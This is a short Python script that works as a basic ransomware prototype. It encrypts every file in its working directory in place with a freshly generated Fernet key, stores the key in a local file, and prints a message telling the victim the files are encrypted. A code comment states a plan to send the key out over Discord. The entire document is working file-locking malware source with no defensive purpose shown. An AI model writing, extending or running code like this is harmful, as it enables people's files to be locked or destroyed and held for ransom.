import os
from cryptography.fernet import Fernet

note = ("Your files are encrypted and safe, decrypt them with decrypter when your ready or need to use them")
files = []

for file in os.listdir():
    if file == "ourfile.py" or file =="pykey":
        continue
    if os.path.isfile(file):
        files.append(file)

key = Fernet.generate_key()

#will change this to use discord to send the key
with open("pykey.key" , "wb") as pykey:
    pykey.write(key)

for file in files:
    with open(file , "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print(note)